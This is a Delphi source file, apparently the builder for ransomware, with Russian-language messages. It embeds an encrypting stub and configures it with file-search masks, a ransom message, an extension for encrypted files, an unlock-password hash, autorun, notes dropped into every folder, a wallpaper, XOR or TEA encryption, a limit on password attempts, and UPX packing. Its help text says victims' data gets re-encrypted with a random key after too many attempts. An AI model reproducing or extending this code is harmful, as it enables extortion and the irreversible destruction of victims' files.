unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls, XPMan, ExtDlgs, clipbrd, Spin, Md5, Resources;

type
  TNewHeader = record
    idReserved:WORD;
    idType:WORD;
    idCount:WORD;
  end;
  TResDirHeader = packed record
    bWidth:Byte;
    bHeight:Byte;
    bColorCount:Byte;
    bReserved:Byte;
    wPlanes:WORD;
    wBitCount:WORD;
    lBytesInRes:Longint;
  end;
  TIconFileResDirEntry = packed record
    DirHeader:TResDirHeader;
    lImageOffset:Longint;
  end;
  TIconResDirEntry = packed record
    DirHeader:TResDirHeader;
    wNameOrdinal:WORD;
  end;
  PIconResDirGrp = ^TIconResDirGrp;
  TIconResDirGrp = packed record
    idHeader:TNewHeader;
    idEntries:array[0..0] of TIconResDirEntry;
  end;
  PIconFileResGrp = ^TIconFileResDirGrp;
  TIconFileResDirGrp = packed record
    idHeader:TNewHeader;
    idEntries:array[0..0] of TIconFileResDirEntry;
  end;

  TForm1 = class(TForm)
    Memo1: TMemo;
    ListBox1: TListBox;
    Edit1: TEdit;
    Button1: TButton;
    Button2: TButton;
    Edit2: TEdit;
    Button3: TButton;
    XPManifest1: TXPManifest;
    OpenPictureDialog2: TOpenPictureDialog;
    SaveDialog1: TSaveDialog;
    Button8: TButton;
    RadioButton1: TRadioButton;
    RadioButton2: TRadioButton;
    GroupBox1: TGroupBox;
    GroupBox2: TGroupBox;
    RadioButton3: TRadioButton;
    RadioButton4: TRadioButton;
    Button4: TButton;
    Memo2: TMemo;
    Button5: TButton;
    GroupBox3: TGroupBox;
    GroupBox4: TGroupBox;
    GroupBox6: TGroupBox;
    GroupBox7: TGroupBox;
    ComboBox1: TComboBox;
    GroupBox9: TGroupBox;
    Label1: TLabel;
    SpinEdit1: TSpinEdit;
    Button6: TButton;
    Edit3: TEdit;
    GroupBox10: TGroupBox;
    Edit4: TEdit;
    Button7: TButton;
    Edit5: TEdit;
    OpenPictureDialog1: TOpenPictureDialog;
    CheckBox1: TCheckBox;
    CheckBox2: TCheckBox;
    CheckBox3: TCheckBox;
    CheckBox4: TCheckBox;
    CheckBox5: TCheckBox;
    procedure CheckBox2Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure CheckBox1Click(Sender: TObject);
    procedure Button7Click(Sender: TObject);
    procedure Button6Click(Sender: TObject);
    procedure Label1Click(Sender: TObject);
    procedure Button5Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Button8Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure ExtractRes(ResType, ResName, ResNewName : String);
    procedure UPX_Pack(filetopack:string);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}
{$R ..\crypter\stub.res}
{$R upx_bin\upx.res}

procedure TForm1.ExtractRes(ResType, ResName, ResNewName : String);
var
  Res : TResourceStream;
begin
  Res := TResourceStream.Create(Hinstance, Resname, Pchar(ResType));
  Res.SavetoFile(ResNewName);
  Res.Free;
end;

procedure SetAppIcon(FileName,IconFile,ResName:string);
var
  I,FileGrpSize,IconGrpSize:Integer;
  Group:Pointer;
  Header:TNewHeader;
  FileGrp:PIconFileResGrp;
  IconGrp:PIconResDirGrp;
  Icon:TIcon;
  Stream:TMemoryStream;
  hUpdateRes:THandle;
begin
  hUpdateRes:=BeginUpdateResource(PChar(FileName), False);
  Icon:=TIcon.Create;
  Icon.LoadFromFile(IconFile);
  Stream:=TMemoryStream.Create;
   try
    Icon.SaveToStream(Stream);
   finally
    Icon.Free;
   end;
  Stream.Position:=0;
  Stream.Read(Header, SizeOf(Header));
  FileGrpSize := SizeOf(TIconFileResDirGrp) + (Header.idCount - 1) * SizeOf(TIconFileResDirEntry);
  IconGrpSize := SizeOf(TIconResDirGrp) + (Header.idCount - 1) * SizeOf(TIconResDirEntry);
  GetMem(FileGrp, FileGrpSize);
  GetMem(IconGrp, IconGrpSize);
  Stream.Position:=0;
  Stream.Read(FileGrp^, FileGrpSize);
  Group:=nil;
   try
    for I:=0 to FileGrp^.idHeader.idCount - 1 do
     begin
      with IconGrp^ do
       begin
        idHeader:=FileGrp^.idHeader;
        idEntries[i].DirHeader:=FileGrp^.idEntries[i].DirHeader;
        idEntries[i].wNameOrdinal:=I;
       end;
       with FileGrp^.idEntries[i] do
       begin
        Stream.Seek(lImageOffset, soFromBeginning);
        ReallocMem(Group, DirHeader.lBytesInRes);
        Stream.Read(Group^, DirHeader.lBytesInRes);
        UpdateResource(hUpdateRes,RT_ICON,PChar(MakeIntResource(I)), 0, Group, DirHeader.lBytesInRes);
       end;
     end;
   UpdateResource(hUpdateRes,RT_GROUP_ICON, PChar(ResName), 0, IconGrp, IconGrpSize);
   EndUpdateResource(hUpdateRes, False);
    finally
     Stream.Free;
     FreeMem(FileGrp);
     FreeMem(IconGrp);
     FreeMem(Group);
    end;
end;

function ExecAndWait(const FileName,
                     Params: ShortString;
                     const WinState: Word): boolean; export;
var
  StartInfo: TStartupInfo;
  ProcInfo: TProcessInformation; 
  CmdLine: ShortString; 
begin
  CmdLine := '"' + Filename + '" ' + Params;
  FillChar(StartInfo, SizeOf(StartInfo), #0);
  with StartInfo do
  begin
    cb := SizeOf(StartInfo);
    dwFlags := STARTF_USESHOWWINDOW;
    wShowWindow := WinState;
  end;
  Result := CreateProcess(nil, PChar( String( CmdLine ) ), nil, nil, false,
                          CREATE_NEW_CONSOLE or NORMAL_PRIORITY_CLASS, nil,
                          PChar(ExtractFilePath(Filename)),StartInfo,ProcInfo);
  if Result then
  begin
    WaitForSingleObject(ProcInfo.hProcess, INFINITE);
    CloseHandle(ProcInfo.hProcess);
    CloseHandle(ProcInfo.hThread); 
  end; 
end;

procedure TForm1.UPX_Pack(filetopack:string);
var
  TmpDir: PChar;
  tmp:string;
begin
  TmpDir := StrAlloc(MAX_PATH);
  GetTempPath(MAX_PATH, TmpDir);
  tmp := string(TmpDir);
  StrDispose(TmpDir);
  tmp:=tmp+'upx.exe';
  ExtractRes('upx', 'upx', tmp);
  ExecAndWait(tmp, '-9 "'+filetopack+'"', SW_HIDE);
  deletefile(pchar(tmp));
end;

procedure TForm1.Button2Click(Sender: TObject);
begin
  listbox1.Clear;
end;

procedure TForm1.Button1Click(Sender: TObject);
begin
  if edit1.text<>'' then listbox1.Items.Add(edit1.text)
end;

procedure TForm1.Button3Click(Sender: TObject);
var
  i,dd,i2,nw,hFile,hMapFile,hMap,fs:dword;
  bb,z:byte;
  RND_KEY: array[0..15] of char;
  s,tmp:string;
  m:TMD5Digest;
begin
  z:=0;
  tmp:=GetCurrentDir+'\encoder-build.tmp';
  if listbox1.Items.Count=0 then
  begin
    MessageBox(0, 'Выбери хотя бы одну маску поиска!', 'Ошибка!', MB_ICONINFORMATION);
    exit;
  end;
  if length(memo1.text)=0 then
  begin
    MessageBox(0, 'Введи сообщение!', 'Ошибка!', MB_ICONINFORMATION);
    exit;
  end;
  if edit2.Text='' then
  begin
    MessageBox(0, 'Введи пароль для дешифрации!', 'Ошибка!', MB_ICONINFORMATION);
    exit;
  end;
  if edit4.Text='' then
  begin
    MessageBox(0, 'Введи расширение для зашифрованных файлов!', 'Ошибка!', MB_ICONINFORMATION);
    exit;
  end;
  if savedialog1.Execute then
  begin
       savedialog1.FileName:=changefileext(savedialog1.FileName, '.exe');
// extract stub form resources
       ExtractRes('EXEFILE', 'STUB', savedialog1.FileName);
// set icon
       if checkbox2.checked then
       SetAppIcon(savedialog1.FileName, openpicturedialog2.filename, 'MAINICON');
// create file with config
       hFile:=CreateFileA(pchar(tmp), GENERIC_READ or GENERIC_WRITE,
                                      FILE_SHARE_READ or FILE_SHARE_WRITE,
                                      nil, CREATE_ALWAYS,
                                      FILE_ATTRIBUTE_HIDDEN, 0);
       if hFile=INVALID_HANDLE_VALUE then exit;
// write xor key
       randomize;
       {dd:=129+random(128);
       WriteFile(hFile, dd, sizeof(dd), nw, nil);
       for i2}
       for i:=1 to 16 do
         begin
           bb:=random(256);
           RND_KEY[i-1]:=chr(bb);
           WriteFile(hFile, bb, sizeof(bb), nw, nil);
         end;
// write search masks
       // sizeof all
       dd:=0;
       for i:=0 to listbox1.Items.count-1 do
       begin
         s:=listbox1.Items[i];
         dd:=dd+(dword(length(s))+1);
       end;
       dd:=dd+4;{4 extra bytes - masks count dword}
       WriteFile(hFile, dd, sizeof(dd), nw, nil);
       // masks count
       dd:=listbox1.Items.count;
       WriteFile(hFile, dd, sizeof(dd), nw, nil);
       // masks
       for i:=0 to listbox1.Items.count-1 do
       begin
          s:=listbox1.Items[i];
          // mask + zerobyte
          for i2:=1 to length(s) do
          begin
            bb:=ord(s[i2]);
            WriteFile(hFile, bb, sizeof(bb), nw, nil);
          end;
          WriteFile(hFile, z, sizeof(z), nw, nil);
       end;
// write message for user
       // sizeof message
       s:=memo1.Text;
       dd:=length(s)+1;
       WriteFile(hFile, dd, sizeof(dd), nw, nil);
       // message
       for i2:=1 to length(s) do
       begin
         bb:=ord(s[i2]);
         WriteFile(hFile, bb, sizeof(bb), nw, nil);
       end;
       WriteFile(hFile, z, sizeof(z), nw, nil);
// write ecrypted files extension
       // sizeof extension
       s:=edit4.Text;
       dd:=length(s)+1;
       WriteFile(hFile, dd, sizeof(dd), nw, nil);
       // extension
       for i2:=1 to length(s) do
       begin
         bb:=ord(s[i2]);
         WriteFile(hFile, bb, sizeof(bb), nw, nil);
       end;
       WriteFile(hFile, z, sizeof(z), nw, nil);
// write hash of unlock password [md5x5]
       m:=MD5String(edit2.text);
       m:=MD5Buffer(m,sizeof(m));
       m:=MD5Buffer(m,sizeof(m));
       m:=MD5Buffer(m,sizeof(m));
       m:=MD5Buffer(m,sizeof(m));
       WriteFile(hFile, m, sizeof(m), nw, nil);
// set to autorun
       if checkbox5.Checked then
          bb:=1
       else
          bb:=0;
       WriteFile(hFile, bb, sizeof(bb), nw, nil);
// write drop txt to all folders or not
       if checkbox4.Checked then
          bb:=1
       else
          bb:=0;
       WriteFile(hFile, bb, sizeof(bb), nw, nil);
// write bool - hide or show message to user
       if radiobutton3.Checked then
          bb:=0
       else
          bb:=1;
       WriteFile(hFile, bb, sizeof(bb), nw, nil);
// write bool - use XOR or TEA
       if radiobutton1.Checked then
          bb:=0
       else
          bb:=1;
       WriteFile(hFile, bb, sizeof(bb), nw, nil);
// write bool - use ENG or RU in face
       if combobox1.ItemIndex=1 then
          bb:=1
       else
          bb:=0;
       WriteFile(hFile, bb, sizeof(bb), nw, nil);
// write random exe name, which is used to drop in temp
       for i:=1 to 15 do
       begin
          case random(3) of
            0: bb:=random($19)+$61; // small letter
            1: bb:=random($0A)+$30; // numbers
            2: bb:=random($1A)+$41; // big letter
          end;
          WriteFile(hFile, bb, sizeof(bb), nw, nil);
       end;
       WriteFile(hFile, z, sizeof(z), nw, nil);
// write reg name
       for i:=1 to 15 do
       begin
          bb:=random(26)+65;
          WriteFile(hFile, bb, sizeof(bb), nw, nil);
       end;
       WriteFile(hFile, z, sizeof(z), nw, nil);
// write number of tries
       dd:=spinedit1.value;
       WriteFile(hFile, dd, sizeof(dd), nw, nil);
// write some random values for crypt -> random for each build
       // TEA ROUNDS
       case random(5) of
         0: dd:=$08;
         1: dd:=$10;
         2: dd:=$20;
         3: dd:=$30;
         4: dd:=$40;
       end;
       WriteFile(hFile, dd, sizeof(dd), nw, nil);
       // START OFFSET [0..127]
       dd:=random(128);
       WriteFile(hFile, dd, sizeof(dd), nw, nil);
       // BUF_SIZE
       dd:=$100000+random($100000); // 1MB + rnd(1MB)
       WriteFile(hFile, dd, sizeof(dd), nw, nil);
// xor the config
       fs:=GetFileSize(hFile,nil);
       if fs=INVALID_FILE_SIZE then exit;
       hMap:=CreateFileMapping(hFile, nil, PAGE_READWRITE, 0, fs, nil);
       if hMap=0 then exit;
       hMapFile:=dword(MapViewOfFile(hMap, FILE_MAP_WRITE, 0, 0, 0));
       if hMapFile=0 then exit;
       for i:=0 to fs-1-16 do
       begin
         bb:=ord(RND_KEY[(i) mod 16]);
         asm
           mov eax, dword ptr [hMapFile]
           add eax, i
           add eax, 16
           mov cl, byte ptr [eax]
           xor cl, byte ptr [bb]
           mov byte ptr [eax], cl
         end;
       end;
// set config resource
       ResUpdateFromData(pointer(hMapFile), fs, savedialog1.FileName, $0E, RT_BITMAP);
// unmap & close
       UnmapViewOfFile(pointer(hMapFile));
       CloseHandle(hMap);
       CloseHandle(hFile);
       DeleteFile(pchar(tmp));
// set wallpaper
       if checkbox1.checked then
       ResUpdateFromFileData(edit5.text, savedialog1.FileName, 'pussylicker', RT_BITMAP);
// pack
       if checkbox3.Checked then
       UPX_Pack(savedialog1.FileName);
// done!
       MessageBox(application.Handle, 'Билд создан!', 'Билд создан', MB_ICONINFORMATION);
end;

end;

procedure TForm1.Button8Click(Sender: TObject);
begin
  listbox1.Items.Delete(listbox1.ItemIndex);
end;

procedure TForm1.Button4Click(Sender: TObject);
var
  s:string;
  i:integer;
begin
  clipboard.Open;
  if clipboard.HasFormat(CF_TEXT) then
    begin
       s:=clipboard.AsText;
    end;
  clipboard.Close;
  memo2.Clear;
  memo2.Text:=s;
  for i:=1 to memo2.Lines.Count do
  listbox1.Items.Add(memo2.Lines[i-1]);
end;

procedure TForm1.Button5Click(Sender: TObject);
var
i:integer;
begin
  edit2.text:='';
  randomize;
  for i:=1 to 24 do
  begin
      case random(3) of
         0:   edit2.text:=edit2.text+chr(random($19)+ord('a'));    // small letter
         1:   edit2.text:=edit2.text+chr(random($0A)+ord('0'));    // numbers
         2:   edit2.text:=edit2.text+chr(random($1A)+ord('A'));    // big letter
      end;
  end;
end;

procedure TForm1.Label1Click(Sender: TObject);
begin
  MessageBox(application.handle,
    'Количество попыток ввода пароля. 0 - без ограничений'#13#10+
    'При превышении количества попыток ввода, зашифрованные данные '+
    'шифруются случайным ключом - восстановить их после этого уже гораздо сложнее',
    'Справка',
    MB_ICONINFORMATION);
end;

procedure TForm1.Button6Click(Sender: TObject);
begin
  if openpicturedialog2.Execute then edit3.text:=openpicturedialog2.FileName;
end;

procedure TForm1.Button7Click(Sender: TObject);
begin
  if openpicturedialog1.Execute then edit5.text:=openpicturedialog1.FileName;
end;

procedure TForm1.CheckBox1Click(Sender: TObject);
begin
  if checkbox1.checked then
  begin
    edit5.Enabled:=true;
    button7.Enabled:=true;
  end
  else
  begin
    edit5.Enabled:=false;
    button7.Enabled:=false;
  end;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
  button5.Click;
end;

procedure TForm1.CheckBox2Click(Sender: TObject);
begin
  if checkbox2.checked then
  begin
    edit3.Enabled:=true;
    button6.Enabled:=true;
  end
  else
  begin
    edit3.Enabled:=false;
    button6.Enabled:=false;
  end;
end;

end.

